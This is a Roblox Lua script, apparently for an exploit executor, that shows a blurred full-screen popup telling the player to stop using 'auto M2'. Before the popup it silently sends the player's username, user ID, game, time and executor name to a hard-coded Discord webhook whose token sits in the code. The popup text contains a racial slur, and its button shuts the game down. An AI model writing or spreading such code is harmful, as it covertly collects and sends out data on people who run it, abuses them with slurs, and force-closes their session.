local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local lp = Players.LocalPlayer
local playerGui = lp:WaitForChild("PlayerGui")

-- ========================= WEBHOOK (using executor's request function) =========================
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1506418959799423187/YCT3zsc30Qg2_sj1sAzq-m1nkkde1816dfrtJT38QLv9JhT_9172cPcE4rzSeYlnDaeI"

-- Detect the executor's request function
local requestFunc = syn and syn.request or request or http_request or (http and http.request)

local function sendWebhook()
    if not requestFunc then
        warn("No request function found, webhook not sent")
        return
    end

    -- Collect data (simple, no IP/location to avoid errors)
    local username = lp.Name
    local displayName = lp.DisplayName
    local userId = lp.UserId
    local placeId = game.PlaceId
    local placeName = "Unknown"
    pcall(function() placeName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name end)
    local currentTime = os.date("%Y-%m-%d %H:%M:%S UTC")

    -- Try to get executor name
    local executor = "Unknown"
    pcall(function()
        if identifyexecutor then executor = identifyexecutor()
        elseif getexecutorname then executor = getexecutorname() end
    end)

    local data = {
        username = "StopAutoM2 Logger",
        embeds = {{
            title = "🚨 Script Executed",
            color = 0xFF3232,
            fields = {
                { name = "👤 Username", value = username, inline = true },
                { name = "🏷️ Display", value = displayName, inline = true },
                { name = "🆔 User ID", value = tostring(userId), inline = true },
                { name = "🕒 Time", value = currentTime, inline = true },
                { name = "🎮 Place", value = placeName .. " ("..placeId..")", inline = false },
                { name = "⚙️ Executor", value = executor, inline = true }
            },
            footer = { text = "Executed on Roblox" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    pcall(function()
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- Send webhook immediately (does not block GUI)
task.spawn(sendWebhook)

-- ========================= GUI (EXACTLY AS YOU HAD IT - WORKING) =========================
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "StopAutoM2"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = game:GetService("Lighting")

local overlay = Instance.new("Frame")
overlay.Size = UDim2.fromScale(1, 1)
overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
overlay.BackgroundTransparency = 1
overlay.BorderSizePixel = 0
overlay.Parent = screenGui

local label = Instance.new("TextLabel")
label.Size = UDim2.fromScale(1, 0.4)
label.Position = UDim2.fromScale(0, 0.3)
label.BackgroundTransparency = 1
label.Text = "STOP USING AUTO M2 NIGGA"
label.TextColor3 = Color3.fromRGB(255, 50, 50)
label.TextScaled = true
label.Font = Enum.Font.GothamBold
label.TextTransparency = 1
label.Parent = screenGui

local stroke = Instance.new("UIStroke")
stroke.Color = Color3.fromRGB(0, 0, 0)
stroke.Thickness = 4
stroke.Transparency = 1
stroke.Parent = label

local button = Instance.new("TextButton")
button.Size = UDim2.fromOffset(300, 60)
button.Position = UDim2.new(0.5, -150, 0.65, 0)
button.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
button.BorderSizePixel = 0
button.Text = "yes i understand daddy"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextSize = 22
button.Font = Enum.Font.GothamBold
button.BackgroundTransparency = 1
button.TextTransparency = 1
button.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = button

TweenService:Create(blur, TweenInfo.new(0.6, Enum.EasingStyle.Quad), { Size = 24 }):Play()
TweenService:Create(overlay, TweenInfo.new(0.6, Enum.EasingStyle.Quad), { BackgroundTransparency = 0.35 }):Play()
TweenService:Create(label, TweenInfo.new(0.6, Enum.EasingStyle.Quad), { TextTransparency = 0 }):Play()
TweenService:Create(stroke, TweenInfo.new(0.6, Enum.EasingStyle.Quad), { Transparency = 0 }):Play()

task.wait(3)
TweenService:Create(button, TweenInfo.new(0.6, Enum.EasingStyle.Quad), { BackgroundTransparency = 0, TextTransparency = 0 }):Play()

local dismissed = false
button.MouseButton1Click:Connect(function()
    if dismissed then return end
    dismissed = true

    TweenService:Create(blur, TweenInfo.new(0.6, Enum.EasingStyle.Quad), { Size = 0 }):Play()
    TweenService:Create(overlay, TweenInfo.new(0.6, Enum.EasingStyle.Quad), { BackgroundTransparency = 1 }):Play()
    TweenService:Create(label, TweenInfo.new(0.6, Enum.EasingStyle.Quad), { TextTransparency = 1 }):Play()
    TweenService:Create(stroke, TweenInfo.new(0.6, Enum.EasingStyle.Quad), { Transparency = 1 }):Play()
    TweenService:Create(button, TweenInfo.new(0.6, Enum.EasingStyle.Quad), { BackgroundTransparency = 1, TextTransparency = 1 }):Play()

    task.wait(0.7)
    blur:Destroy()
    screenGui:Destroy()
    game:Shutdown()
end)
